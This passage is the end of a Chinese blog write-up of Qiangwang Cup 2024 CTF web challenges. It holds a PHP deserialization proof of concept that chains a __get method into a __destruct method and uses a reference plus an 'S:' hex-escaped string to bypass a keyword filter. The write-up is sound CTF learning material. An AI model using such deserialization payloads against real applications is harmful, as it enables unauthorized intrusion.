</span></span></code></pre></td></tr></table></div></div><p>但是写了一下好像是打不通的</p><hr><p>看了朋友的wp同时和大家交流发现可以这么打通，首先，要求哪里不一定非要写脚本打，可以直接抓包拿到源码，拿到源码之后再次分析链子，发现还是不够会想，一般的反序列化头头都是destruct</p><p>而这里是<code>get</code>，如何进入呢</p><p><img src=/p/qiangwang-cup-2024/QQ20241104-172208.png width=1305 height=387 loading=lazy alt=1></p><p>那也就是我们只要被解析的最外面的类没有<code>password</code>就可以进入<code>get</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root::get-&gt;user::destruct
</span></span></code></pre></td></tr></table></div></div><p>写个<code>poc</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>root</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$value</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>user</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$password</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$value</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>root</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>=</span><span class=k>new</span> <span class=nx>user</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>=</span><span class=s2>&#34;2024qwb&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>value</span><span class=o>=&amp;</span><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>-&gt;</span><span class=na>username</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>=</span><span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;s:7:&#34;2024qwb&#34;&#39;</span><span class=p>,</span><span class=s1>&#39;S:7:&#34;2024\\71wb&#34;&#39;</span><span class=p>,</span><span class=nv>$b</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$c</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>引用赋值两个值都会改变(<del>好久没用快忘了</del>)，记得换成<code>S</code>，不然无效，不清楚过程的可以调试一下</p><h1 id=0x03-小结>0x03 小结</h1><p>web题主要就是卡在了路由的地方，代审的题目呢，不是很简单，黑盒呢，测得非常难受，不过一有回显我就会非常激动哈哈，开心:happy:</p></section><footer class=article-footer><section class=article-tags><a href=/tags/php/>Php</a>
<a href=/tags/go/>Go</a>
<a href=/tags/flask/>Flask</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
2024 -
2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>